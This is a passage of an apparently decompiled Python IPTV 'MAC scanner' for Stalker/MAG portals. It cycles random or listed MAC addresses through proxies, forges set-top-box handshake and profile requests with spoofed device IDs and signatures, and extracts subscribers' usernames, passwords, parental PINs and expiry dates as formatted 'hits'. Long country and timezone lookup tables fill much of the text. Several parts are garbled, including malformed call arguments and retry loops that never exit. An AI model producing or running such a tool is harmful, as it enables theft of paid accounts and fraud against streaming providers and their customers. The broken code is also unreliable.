            timezone = timezone.replace('Africa/Tunis', 'Africa Tunis Tunisia 🇹🇳')
            timezone = timezone.replace('Pacific/Tongatapu', 'Pacific Tongatapu Tonga 🇹🇴')
            timezone = timezone.replace('Europe/Istanbul', 'Europe Istanbul Turkey 🇹🇷')
            timezone = timezone.replace('America/Port_of_Spain', 'America Port of Spain Trinidad and Tobago 🇹🇹')
            timezone = timezone.replace('Pacific/Funafuti', 'Pacific Funafuti Tuvalu 🇹🇻')
            timezone = timezone.replace('Asia/Taipei', 'Asia Taipei Taiwan 🇹🇼')
            timezone = timezone.replace('Africa/Dar_es_Salaam', 'Africa Dar es Salaam Tanzania 🇹🇿')
            timezone = timezone.replace('Europe/Kiev', 'Europe Kiev Ukraine 🇺🇦')
            timezone = timezone.replace('Europe/Uzhgorod', 'Europe Uzhgorod Ukraine 🇺🇦')
            timezone = timezone.replace('Europe/Zaporozhye', 'Europe Zaporozhye Ukraine 🇺🇦')
            timezone = timezone.replace('Europe/Simferopol', 'Europe Simferopol Ukraine 🇺🇦')
            timezone = timezone.replace('Africa/Kampala', 'Africa Kampala Uganda 🇺🇬')
            timezone = timezone.replace('Pacific/Johnston', 'Pacific Johnston USA 🇺🇸')
            timezone = timezone.replace('Pacific/Midway', 'Pacific Midway USA 🇺🇸')
            timezone = timezone.replace('Pacific/Wake', 'Pacific Wake USA 🇺🇸')
            timezone = timezone.replace('America/New_York', 'America New York USA 🇺🇸')
            timezone = timezone.replace('America/Detroit', 'America Detroit USA 🇺🇸')
            timezone = timezone.replace('America/Kentucky/Louisville', 'America Kentucky Louisville USA 🇺🇸')
            timezone = timezone.replace('America/Kentucky/Monticello', 'America Kentucky Monticello USA 🇺🇸')
            timezone = timezone.replace('America/Indiana/Indianapolis', 'America Indiana Indianapolis USA 🇺🇸')
            timezone = timezone.replace('America/Indiana/Vincennes', 'America Indiana Vincennes USA 🇺🇸')
            timezone = timezone.replace('America/Indiana/Winamac', 'America Indiana Winamac USA 🇺🇸')
            timezone = timezone.replace('America/Indiana/Marengo', 'America Indiana Marengo USA 🇺🇸')
            timezone = timezone.replace('America/Indiana/Petersburg', 'America Indiana Petersburg USA 🇺🇸')
            timezone = timezone.replace('America/Indiana/Vevay', 'America Indiana Vevay USA 🇺🇸')
            timezone = timezone.replace('America/Chicago', 'America Chicago USA 🇺🇸')
            timezone = timezone.replace('America/Indiana/Tell_City', 'America Indiana Tell City USA 🇺🇸')
            timezone = timezone.replace('America/Indiana/Knox', 'America Indiana/Knox USA 🇺🇸')
            timezone = timezone.replace('America/Menominee', 'America Menominee USA 🇺🇸')
            timezone = timezone.replace('America/North_Dakota/Center', 'America North Dakota Center USA 🇺🇸')
            timezone = timezone.replace('America/North_Dakota/New_Salem', 'America North Dakota New Salem USA 🇺🇸')
            timezone = timezone.replace('America/North_Dakota/Beulah', 'America North Dakota Beulah USA 🇺🇸')
            timezone = timezone.replace('America/Denver', 'America Denver USA 🇺🇸')
            timezone = timezone.replace('America/Boise', 'America Boise USA 🇺🇸')
            timezone = timezone.replace('America/Shiprock', 'America Shiprock USA 🇺🇸')
            timezone = timezone.replace('America/Phoenix', 'America Phoenix USA 🇺🇸')
            timezone = timezone.replace('America/Los_Angeles', 'America Los Angeles USA 🇺🇸')
            timezone = timezone.replace('America/Anchorage', 'America Anchorage USA 🇺🇸')
            timezone = timezone.replace('America/Juneau', 'America Juneau USA 🇺🇸')
            timezone = timezone.replace('America/Sitka', 'America Sitka USA 🇺🇸')
            timezone = timezone.replace('America/Yakutat', 'America Yakutat USA 🇺🇸')
            timezone = timezone.replace('America/Nome', 'America Nome USA 🇺🇸')
            timezone = timezone.replace('America/Adak', 'America Adak USA 🇺🇸')
            timezone = timezone.replace('America/Metlakatla', 'America Metlakatla USA 🇺🇸')
            timezone = timezone.replace('Pacific/Honolulu', 'Pacific Honolulu USA 🇺🇸')
            timezone = timezone.replace('America/Montevideo', 'America Montevideo Uruguay 🇺🇾')
            timezone = timezone.replace('Asia/Samarkand', 'Asia Samarkand Uzbekistan 🇺🇿 ')
            timezone = timezone.replace('Asia/Tashkent', 'Asia Tashkent Uzbekistan 🇺🇿 ')
            timezone = timezone.replace('Europe/Vatican', 'Europe Vatican City State 🇻🇦')
            timezone = timezone.replace('America/St_Vincent', 'America Saint Vincent and the Grenadines 🇻🇨')
            timezone = timezone.replace('America/Caracas', 'America Caracas Venezuela 🇻🇪')
            timezone = timezone.replace('America/Tortola', 'America Tortola British Virgin Islands 🇻🇬')
            timezone = timezone.replace('America/St_Thomas', 'America Saint Thomas US Virgin Islands 🇻🇮')
            timezone = timezone.replace('Asia/Ho_Chi_Minh', 'Asia Ho Chi Minh Vietnam 🇻🇳')
            timezone = timezone.replace('Pacific/Efate', 'Pacific Efate Vanuatu 🇻🇺')
            timezone = timezone.replace('Pacific/Wallis', 'Pacific Wallis and Futuna 🇼🇫')
            timezone = timezone.replace('Pacific/Apia', 'Pacific Apia Samoa 🇼🇸')
            timezone = timezone.replace('Asia/Aden', 'Asia Aden Yemen 🇾🇪')
            timezone = timezone.replace('Indian/Mayotte', 'Indian Mayotte 🇾🇹')
            timezone = timezone.replace('Africa/Johannesburg', 'Africa Johannesburg South Africa 🇿🇦')
            timezone = timezone.replace('Africa/Lusaka', 'Africa Lusaka Zambia 🇿🇲')
            timezone = timezone.replace('Africa/Harare', 'Africa Harare Zimbabwe 🇿🇼')
        except:
            pass

        realm = veri.split('url":')[1]
        realm = realm.split(',')[0]
        realm = realm.replace('"', '')
        port = veri.split('port":')[1]
        port = port.split(',')[0]
        port = port.replace('"', '')
        userm = veri.split('username":')[1]
        userm = userm.split(',')[0]
        userm = userm.replace('"', '')
        pasm = veri.split('password":')[1]
        pasm = pasm.split(',')[0]
        pasm = pasm.replace('"', '')
        bitism = veri.split('exp_date":')[1]
        bitism = bitism.split(',')[0]
        bitism = bitism.replace('"', '')
        
        try:
            message = veri.split('message":"')[1].split(',')[0].replace('"', '')
            message = str(message.encode('utf-8').decode('unicode-escape')).replace('\\/', '/')
        except:
            pass

        if message == '':
            message = 'ᴛʜᴀɴᴋ ʏᴏᴜ ᴄᴋɪᴘᴛᴠ'
        if bitism == 'null':
            bitism = 'Unlimited'
        else:
            bitism = datetime.datetime.fromtimestamp(int(bitism)).strftime('%d.%b.%Y')
            today = str(datetime.datetime.today().strftime('%d.%b.%Y'))
            d1 = datetime.datetime.strptime(today, '%d.%b.%Y')
            d2 = datetime.datetime.strptime(bitism, '%d.%b.%Y')
            daysleft = abs((d2 - d1).days)
            daysleft = str(daysleft)
        mt = '\n┏❖ꜱᴘx ᴠ3 ᴘʏ ᴄᴏɴꜰɪɢ❖\n┣❖R⇥http://' + realm + ':' + port + '/c/\n┣❖Usᴇʀ⇥' + userm + '\n┣❖Pᴀss⇥' + pasm + '\n┣❖Port⇥' + port + '\n┣❖Cᴏɴɴ⇥ ᴍᴀx:' + mcon + ' ⁃ ᴀᴄᴛ:' + acon + '\n┣❖Sᴛᴀᴛᴜꜱ⇥' + status + '\n┣❖Exᴘ⇥' + bitism + '(' + daysleft + ' Dias)\n┣❖Tᴢᴏɴᴇ⇥' + timezone + '\n┣❖Message⇥ ' + str(message) + ' \n┣❖ Hɪᴛꜱ ʙʏ ⇥' + nickn + '\n┗❖❖ꜱᴘx ᴠ3 ᴘʏ ᴄᴏɴꜰɪɢ❖❖ \n'
    return mt


def goruntu(link, cid):
    duru = 'ᴍᴀᴄ ᴏꜰꜰ🥺'
    
    try:
        res = ses.get(link, hea3(), 10, False, True, **('headers', 'timeout', 'allow_redirects', 'stream'))
        if res.status_code == 302 or res.status_code == 406:
            duru = 'ᴀᴄᴛɪᴠᴇ ᴍᴀᴄ😝'
    except:
        duru = 'ᴍᴀᴄ ᴏꜰꜰ🥺'

    return duru


def url7(cid):
    url = http + '://' + panel + '/' + uzmanm + '?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/' + str(cid) + '_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml'
    if uzmanm == 'stalker_portal/server/load.php':
        url7 = http + '://' + panel + '/' + uzmanm + '?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/' + str(cid) + '&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml'
        url7 = http + '://' + panel + '/' + uzmanm + '?type=itv&action=create_link&cmd=ffrt%20http:///ch/' + str(cid) + '&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml'
    return str(url)


def hea3():
    hea = {
        'Icy-MetaData': '1',
        'User-Agent': 'Lavf/57.83.100',
        'Accept-Encoding': 'identity',
        'Host': panel,
        'Accept': '*/*',
        'Range': 'bytes=0-',
        'Connection': 'close' }
    return hea


def hitecho(mac, trh):
    sesdosya = '/sdcard/SPX/sound/yo.mp3'
    file = pathlib.Path(sesdosya)
    
    try:
        if file.exists():
            ad.mediaPlay(sesdosya)
    except:
        pass



def unicode(fyz):
    cod = fyz.encode('utf-8').decode('unicode-escape').replace('\\/', '/')
    return cod


def duzel2(veri, vr):
    data = ''
    
    try:
        data = veri.split('"' + str(vr) + '":"')[1]
        data = data.split('"')[0]
        data = data.replace('"', '')
        data = unicode(data)
    except:
        pass

    return str(data)


def duzelt1(veri, vr):
    data = veri.split(str(vr) + '":"')[1]
    data = data.split('"')[0]
    data = data.replace('"', '')
    return str(data)

import datetime
import time
import hashlib
import urllib

def url2(mac, random):
    macs = mac.upper()
    macs = urllib.parse.quote(macs)
    SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
    SNENC = SN.upper()
    SNCUT = SNENC[:13]
    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
    DEVENC = DEV.upper()
    DEV1 = hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
    DEVENC1 = DEV1.upper()
    SG = SNCUT + mac
    SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
    SINGENC = SING.upper()
    url22 = http + '://' + panel + '/' + uzmanm + '?type=stb&action=get_profile&JsHttpRequest=1-xml'
    if uzmanm == 'stalker_portal/server/load.php':
        times = time.time()
        url22 = http + '://' + panel + '/' + uzmanm + '?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn=' + SNCUT + '&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id=' + DEVENC + '&device_id2=' + DEVENC + '&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22' + macs + '%22%2C%22sn%22%3A%22' + SNCUT + '%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22' + random + '%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp=' + str(times) + '&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml'
        if stalker_portal == '2':
            url22 = http + '://' + panel + '/' + uzmanm + '?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn=' + SNCUT + '&stb_type=MAG254&image_version=218&video_out=hdmi&device_id=' + DEVENC + '&device_id2=' + DEVENC + '&signature=' + SINGENC + '&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp=' + str(times) + '&api_signature=263&metrics={\\"mac\\":\\"' + macs + '\\",\\"sn\\":\\"' + SNCUT + '\\",\\"model\\":\\"MAG254\\",\\"type\\":\\"STB\\",\\"uid\\":\\"' + DEVENC + '\\",\\"random\\":\\"' + random + '\\"}&JsHttpRequest=1-xml'
        if stalker_portal == '1':
            url22 = http + '://' + panel + '/' + uzmanm + '?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A%200.2.18-r23-254%3B%20ImageDate%3A%20Wed%20Oct%2031%2015%3A22%3A54%20EEST%202018%3B%20PORTAL%20version%3A%205.5.0%3B%20API%20Version%3A%20JS%20API%20version%3A%20343%3B%20STB%20API%20version%3A%20146%3B%20Player%20Engine%20version%3A%200x58c&num_banks=2&sn=' + SNCUT + '&client_type=STB&image_version=218&video_out=hdmi&device_id=' + DEVENC + '&device_id2=' + DEVENC + '&signature=' + SINGENC + '&auth_second_step=1&hw_version=2.6-IB-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22' + macs + '%22%2C%22sn%22%3A%22' + SNCUT + '%22%2C%22type%22%3A%22STB%22%2C%22model%22%3A%22MAG254%22%2C%22uid%22%3A%22' + DEVENC + '%22%2C%22random%22%3A%22' + random + '%22%7D&hw_version_2=5ab8c9dceec64b9540bb41bc527e88658aa8c620&timestamp=' + str(times) + '&api_signature=262&prehash=4cda0db2375f15f906d2b4df85fc58e05b839d79&JsHttpRequest=1-xml'
    if realblue == 'real' or uzmanm == 'c/portal.php':
        url22 = http + '://' + panel + '/' + uzmanm + '?&action=get_profile&mac=' + macs + '&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22' + macs + '%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
    return url22


def XD():
    global bot, tokenr, tokenr, hit, hitr, m3uvpn, m3uon, macvpn, macon
    bot = bot + 1
    for ckgroup in range(combouz):
        if comboc == 'ckgroup':
            mac = randommac()
        else:
            macv = re.search(pattern, combogetir(), re.IGNORECASE)
            if macv:
                mac = macv.group()
            
        url = http + '://' + panel + '/' + uzmanm + '?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml'
        ses = requests.Session()
        prox = proxygetir()
        oran = round((combosay / combouz) * 100, 2)
        while True:
            try:
                res = ses.get(url, hea1(panel, mac), prox, 3, **('headers', 'proxies', 'timeout'))
            except:
                prox = proxygetir()
        veri = str(res.text)
        random = ''
        if 'token":"' not in veri:
            tokenr = '\33[95m'
            tokenr = ' ' + tokenr
            ses.close
            res.close
            continue
        tokenr = '\33[0m'
        token = duzelt1(veri, 'token')
        if 'random' in veri:
            random = duzelt1(veri, 'random')
        veri = ''
        while True:
            
            try:
                res = ses.get(url2(mac, random), hea2(mac, token), prox, 3, **('headers', 'proxies', 'timeout'))
            except:
                prox = proxygetir()

        veri = str(res.text)
        id = 'null'
        ip = ''
        login = ''
        parent_password = ''
        password = ''
        stb_type = ''
        tariff_plan_id = ''
        comment = ''
        country = ''
        settings_password = ''
        expire_billing_date = ''
        max_online = ''
        expires = ''
        ls = ''
        
        try:
            id = veri.split('{"js":{"id":')[1]
            id = str(id.split(',"name')[0])
        except:
            pass

        
        try:
            ip = str(duzel2(veri, 'ip'))
        except:
            pass

        
        try:
            expires = str(duzel2(veri, 'expires'))
        except:
            pass

        if id == 'null' and expires == '' and ban == '':
            continue
            ses.close
            res.close
        if uzmanm == 'stalker_portal/server/load.php' and 'login":"' in veri:
            login = str(duzel2(veri, 'login'))
            parent_password = str(duzel2(veri, 'parent_password'))
            password = str(duzel2(veri, 'password'))
            stb_type = str(duzel2(veri, 'stb_type'))
            tariff_plan_id = str(duzel2(veri, 'tariff_plan_id'))
            comment = str(duzel2(veri, 'comment'))
            if comment == '':
                comment = 'Respeitɑ Minhɑ Historiɑ'
            country = str(duzel2(veri, 'country'))
            country = country.replace('AL', 'Albania 🇦🇱')
            country = country.replace('AF', 'Afghanistan 🇦🇫')
            country = country.replace('DZ', 'Algeria 🇩🇿')
            country = country.replace('AS', 'American Samoa 🇦🇸')
            country = country.replace('AD', 'Andorra 🇦🇩')
            country = country.replace('AO', 'Angola 🇦🇴')
            country = country.replace('AI', 'Anguilla 🇦🇮')
            country = country.replace('AG', 'Antigua and Barbuda 🇦🇬')
            country = country.replace('AR', 'Argentina 🇦🇷')
            country = country.replace('AM', 'Armenia 🇦🇲')
            country = country.replace('AU', 'Australia 🇦🇺')
            country = country.replace('AW', 'Aruba 🇦🇼')
            country = country.replace('AT', 'Austria 🇦🇹')
            country = country.replace('AZ', 'Azerbaijan 🇦🇿')
            country = country.replace('BS', 'Bahamas 🇧🇸')
            country = country.replace('BY', 'Bahrain 🇧🇾')
            country = country.replace('BD', 'Bangladesh 🇧🇩')
            country = country.replace('BB', 'Barbados 🇧🇧')
            country = country.replace('BY', 'Belarus 🇧🇾')
            country = country.replace('BE', 'Belgium 🇧🇪')
            country = country.replace('BZ', 'Belize 🇧🇿')
            country = country.replace('BJ', 'Benin 🇧🇯')
            country = country.replace('BM', 'Bermuda 🇧🇲')
            country = country.replace('BT', 'Bhutan 🇧🇹')
            country = country.replace('BO', 'Bolivia 🇧🇴')
            country = country.replace('BQ', 'Bonaire 🇧🇶')
            country = country.replace('BA', 'Bosnia and Herzegovina 🇧🇦')
            country = country.replace('BW', 'Botswana 🇧🇼')
            country = country.replace('BR', 'Brazil 🇧🇷')
            country = country.replace('IO', 'British Indian Ocean Territory 🇮🇴')
            country = country.replace('VG', 'British Virgin Islands 🇻🇬')
            country = country.replace('BN', 'Brunei 🇧🇳')
            country = country.replace('BG', 'Bulgaria 🇧🇬')
            country = country.replace('BF', 'Burkina Faso 🇧🇫')
            country = country.replace('BI', 'Burundi 🇧🇮')
            country = country.replace('KH', 'Cambodia 🇰🇭')
            country = country.replace('CM', 'Cameroon 🇨🇲')
            country = country.replace('CA', 'Canada 🇨🇦')
            country = country.replace('CV', 'Cape Verde 🇨🇻')
            country = country.replace('KY', 'Cayman Islands 🇰🇾')
            country = country.replace('CF', 'Central African Republic 🇨🇫')
            country = country.replace('TD', 'Chad 🇹🇩')
            country = country.replace('CL', 'Chile 🇨🇱')
            country = country.replace('CN', 'China 🇨🇳')
            country = country.replace('CX', 'Christmas Island 🇨🇽')
            country = country.replace('CC', 'Cocos Islands 🇨🇨')
            country = country.replace('CO', 'Colombia 🇨🇴')
            country = country.replace('KM', 'Comoros 🇰🇲')
            country = country.replace('CK', 'Cook Islands 🇨🇰')
            country = country.replace('CR', 'Costa Rica 🇨🇷')
            country = country.replace('HR', 'Croatia 🇭🇷')
            country = country.replace('CU', 'Cuba 🇨🇺')
            country = country.replace('CW', 'Curacao 🇨🇼')
            country = country.replace('CY', 'Cyprus 🇨🇾')
            country = country.replace('CI', "Côte d'Ivoire 🇨🇮")
            country = country.replace('CZ', 'Czech Republic 🇨🇿')
            country = country.replace('CD', 'Democratic Republic of the Congo 🇨🇩')
            country = country.replace('DK', 'Denmark 🇩🇰')
            country = country.replace('DJ', 'Djibouti 🇩🇯')
            country = country.replace('DM', 'Dominica 🇩🇲')
            country = country.replace('DO', 'Dominican Republic 🇩🇴')
            country = country.replace('EC', 'Ecuador 🇪🇨')
            country = country.replace('EG', 'Egypt 🇪🇬')
            country = country.replace('SV', 'El Salvador 🇸🇻')
            country = country.replace('GQ', 'Equatorial Guinea 🇬🇶')
            country = country.replace('ER', 'Eritrea 🇪🇷')
            country = country.replace('EE', 'Estonia 🇪🇪')
            country = country.replace('ET', 'Ethiopia 🇪🇹')
            country = country.replace('FK', 'Falkland Islands 🇫🇰')
            country = country.replace('FO', 'Faroe Islands 🇫🇴')
            country = country.replace('FJ', 'Fiji 🇫🇯')
            country = country.replace('FI', 'Finland 🇫🇮')
            country = country.replace('FR', 'France 🇫🇷')
            country = country.replace('GF', 'French Guiana 🇬🇫')
            country = country.replace('PF', 'French Polynesia 🇵🇫')
            country = country.replace('GA', 'Gabon 🇬🇦')
            country = country.replace('GM', 'Gambia 🇬🇲')
            country = country.replace('GE', 'Georgia 🇬🇪')
            country = country.replace('DE', 'Germany 🇩🇪')
            country = country.replace('GH', 'Ghana 🇬🇭')
            country = country.replace('GI', 'Gibraltar 🇬🇮')
            country = country.replace('GR', 'Greece 🇬🇷')
            country = country.replace('GL', 'Greenland 🇬🇱')
            country = country.replace('GD', 'Grenada 🇬🇩')
            country = country.replace('GP', 'Guadeloupe 🇬🇵')
            country = country.replace('GU', 'Guam 🇬🇺')
            country = country.replace('GT', 'Guatemala 🇬🇹')
            country = country.replace('GG', 'Guernsey 🇬🇬')
            country = country.replace('GN', 'Guinea 🇬🇳')
            country = country.replace('GW', 'Guinea-Bissau 🇬🇼')
            country = country.replace('GY', 'Guyana 🇬🇾')
            country = country.replace('HT', 'Haiti 🇭🇹')
            country = country.replace('HN', 'Honduras 🇭🇳')
            country = country.replace('HK', 'Hong Kong 🇭🇰')
            country = country.replace('HU', 'Hungary 🇭🇺')
            country = country.replace('IS', 'Iceland 🇮🇸')
            country = country.replace('IN', 'India 🇮🇳')
            country = country.replace('ID', 'Indonesia 🇮🇩')
            country = country.replace('IR', 'Iran 🇮🇷')
            country = country.replace('IQ', 'Iraq 🇮🇶')
            country = country.replace('IE', 'Ireland 🇮🇪')
            country = country.replace('IL', 'Israel 🇮🇱')
            country = country.replace('IT', 'Italy 🇮🇹')
            country = country.replace('IM', 'Isle of Man 🇮🇲')
            country = country.replace('JM', 'Jamaica 🇯🇲')
            country = country.replace('JP', 'Japan 🇯🇵')
            country = country.replace('JE', 'Jersey 🇯🇪')
            country = country.replace('JO', 'Jordan 🇯🇴')
            country = country.replace('KZ', 'Kazakhstan 🇰🇿')
            country = country.replace('KE', 'Kenya 🇰🇪')
            country = country.replace('KI', 'Kiribati 🇰🇮')
            country = country.replace('XK', 'Kosovo 🇽🇰')
            country = country.replace('KW', 'Kuwait 🇰🇼')
            country = country.replace('KG', 'Kyrgyzstan 🇰🇬')
            country = country.replace('LA', 'Laos 🇱🇦')
            country = country.replace('LV', 'Latvia 🇱🇻')
            country = country.replace('LB', 'Lebanon 🇱🇧')
            country = country.replace('LS', 'Lesotho 🇱🇸')
            country = country.replace('LR', 'Liberia 🇱🇷')
            country = country.replace('LY', 'Libya 🇱🇾')
            country = country.replace('LI', 'Liechtenstein 🇱🇮')
            country = country.replace('LT', 'Lithuania 🇱🇹')
            country = country.replace('LU', 'Luxembourg 🇱🇺')
            country = country.replace('MO', 'Macau 🇲🇴')
            country = country.replace('MK', 'North Macedonia 🇲🇰')
            country = country.replace('MG', 'Madagascar 🇲🇬')
            country = country.replace('MW', 'Malawi 🇲🇼')
            country = country.replace('MY', 'Malaysia 🇲🇾')
            country = country.replace('MV', 'Maldives 🇲🇻')
            country = country.replace('ML', 'Mali 🇲🇱')
            country = country.replace('MT', 'Malta 🇲🇹')
            country = country.replace('MH', 'Marshall Islands 🇲🇭')
            country = country.replace('MQ', 'Martinique 🇲🇶')
            country = country.replace('MR', 'Mauritania 🇲🇷')
            country = country.replace('MU', 'Mauritius 🇲🇺')
            country = country.replace('YT', 'Mayotte 🇾🇹')
            country = country.replace('MX', 'Mexico 🇲🇽')
            country = country.replace('FM', 'Micronesia 🇫🇲')
            country = country.replace('MD', 'Moldova 🇲🇩')
            country = country.replace('MC', 'Monaco 🇲🇨')
            country = country.replace('MN', 'Mongolia 🇲🇳')
            country = country.replace('ME', 'Montenegro 🇲🇪')
            country = country.replace('MS', 'Montserrat 🇲🇸')
            country = country.replace('MA', 'Morocco 🇲🇦')
            country = country.replace('MZ', 'Mozambique 🇲🇿')
            country = country.replace('MM', 'Myanmar 🇲🇲')
            country = country.replace('NA', 'Namibia 🇳🇦')
            country = country.replace('NR', 'Nauru 🇳🇷')
            country = country.replace('NP', 'Nepal 🇳🇵')
            country = country.replace('NL', 'Netherlands 🇳🇱')
            country = country.replace('NC', 'New Caledonia 🇳🇨')
            country = country.replace('NZ', 'New Zealand 🇳🇿')
            country = country.replace('NI', 'Nicaragua 🇳🇮')
            country = country.replace('NE', 'Niger 🇳🇪')
            country = country.replace('NG', 'Nigeria 🇳🇬')
            country = country.replace('NU', 'Niue 🇳🇺')
            country = country.replace('NF', 'Norfolk Island 🇳🇫')
            country = country.replace('KP', 'North Korea 🇰🇵')
            country = country.replace('MP', 'Northern Mariana Islands 🇲🇵')
            country = country.replace('NO', 'Norway 🇳🇴')
            country = country.replace('OM', 'Oman 🇴🇲')
            country = country.replace('PK', 'Pakistan 🇵🇰')
            country = country.replace('PW', 'Palau 🇵🇼')
            country = country.replace('PS', 'Palastinian Territories 🇵🇸')
            country = country.replace('PA', 'Panama 🇵🇦')
            country = country.replace('PG', 'Papua New Guinea 🇵🇬')
            country = country.replace('PY', 'Paraguay 🇵🇾')
            country = country.replace('PE', 'Peru 🇵🇪')
            country = country.replace('PH', 'Philippines 🇵🇭')
            country = country.replace('PN', 'Pitcairn Islands 🇵🇳')
            country = country.replace('PL', 'Poland 🇵🇱')
            country = country.replace('PT', 'Portugal 🇵🇹')
            country = country.replace('PR', 'Puerto Rico 🇵🇷')
            country = country.replace('QA', 'Qatar 🇶🇦')
            country = country.replace('CG', 'Republic of the Congo 🇨🇬')
            country = country.replace('RE', 'Réunion 🇷🇪')
            country = country.replace('RO', 'Romania 🇷🇴')
            country = country.replace('RU', 'Russia 🇷🇺')
            country = country.replace('RW', 'Rwanda 🇷🇼')
            country = country.replace('BL', 'Saint Barthélemy 🇧🇱')
            country = country.replace('SH', 'Saint Helena 🇸🇭')
            country = country.replace('KN', 'Saint Kitts and Nevis 🇰🇳')
            country = country.replace('LC', 'Saint Lucia 🇱🇨')
            country = country.replace('MF', 'Saint Martin 🇲🇫')
            country = country.replace('PM', 'Saint Pierre and Miquelon 🇵🇲')
            country = country.replace('VC', 'Saint Vincent and the Grenadines 🇻🇨')
            country = country.replace('WS', 'Samoa 🇼🇸')
            country = country.replace('SM', 'San Marino 🇸🇲')
            country = country.replace('ST', 'São Tomé and Príncipe 🇸🇹')
            country = country.replace('SA', 'Saudi Arabia 🇸🇦')
            country = country.replace('SN', 'Senegal 🇸🇳')
            country = country.replace('RS', 'Serbia 🇷🇸')
            country = country.replace('SC', 'Seychelles 🇸🇨')
            country = country.replace('SL', 'Sierra Leone 🇸🇱')
            country = country.replace('SG', 'Singapore 🇸🇬')
            country = country.replace('SX', 'Sint Maarten 🇸🇽')
            country = country.replace('SK', 'Slovakia 🇸🇰')
            country = country.replace('SI', 'Slovenia 🇸🇮')
            country = country.replace('SB', 'Solomon Islands 🇸🇧')
            country = country.replace('SO', 'Somalia 🇸🇴')
            country = country.replace('ZA', 'South Africa 🇿🇦')
            country = country.replace('GS', 'South Georgia and the South Sandwich Islands 🇬🇸')
            country = country.replace('KR', 'South Korea 🇰🇷')
            country = country.replace('SS', 'South Sudan 🇸🇸')
            country = country.replace('ES', 'Spain 🇪🇸')
            country = country.replace('LK', 'Sri Lanka 🇱🇰')
            country = country.replace('SD', 'Sudan 🇸🇩')
            country = country.replace('SR', 'Suriname 🇸🇷')
            country = country.replace('SJ', 'Svalbard and Jan Mayen 🇸🇯')
            country = country.replace('SZ', 'Swaziland 🇸🇿')
            country = country.replace('SE', 'Sweden 🇸🇪')
            country = country.replace('CH', 'Switzerland 🇨🇭')
            country = country.replace('SY', 'Syria 🇸🇾')
            country = country.replace('TW', 'Taiwan 🇹🇼')
            country = country.replace('TJ', 'Tajikistan 🇹🇯')
            country = country.replace('TZ', 'Tanzania 🇹🇿')
            country = country.replace('TH', 'Thailand 🇹🇭')
            country = country.replace('TL', 'Timor-Leste 🇹🇱')
            country = country.replace('TG', 'Togo 🇹🇬')
            country = country.replace('TK', 'Tokelau 🇹🇰')
            country = country.replace('TO', 'Tonga 🇹🇴')
            country = country.replace('TT', 'Trinidad and Tobago 🇹🇹')
            country = country.replace('TN', 'Tunisia 🇹🇳')
            country = country.replace('TR', 'Turkey 🇹🇷')
            country = country.replace('TM', 'Turkmenistan 🇹🇲')
            country = country.replace('TC', 'Turks and Caicos Islands 🇹🇨')
            country = country.replace('TV', 'Tuvalu 🇹🇻')
            country = country.replace('UG', 'Uganda 🇺🇬')
            country = country.replace('UA', 'Ukraine 🇺🇦')
            country = country.replace('AE', 'United Arab Emirates 🇦🇪')
            country = country.replace('GB', 'United Kingdom 🇬🇧')
            country = country.replace('US', 'United States 🇺🇸')
            country = country.replace('UY', 'Uruguay 🇺🇾')
            country = country.replace('UZ', 'Uzbekistan 🇺🇿')
            country = country.replace('VU', 'Vanuatu 🇻🇺')
            country = country.replace('VE', 'Venezuela 🇻🇪')
            country = country.replace('VN', 'Vietnam 🇻🇳')
            country = country.replace('VG', 'Virgin Islands, British 🇻🇬')
            country = country.replace('VI', 'Virgin Islands, U.S. 🇻🇮')
            country = country.replace('WF', 'Wallis and Futuna 🇼🇫')
            country = country.replace('YE', 'Yemen 🇾🇪')
            country = country.replace('ZM', 'Zambia 🇿🇲')
            country = country.replace('ZW', 'Zimbabwe 🇿🇼')
            country = country.replace('AX', 'Åland Islands 🇦🇽')
            country = country.replace('EH', 'Western Sahara 🇪🇭')
            country = country.replace('GB', 'Great Britain 🇬🇧')
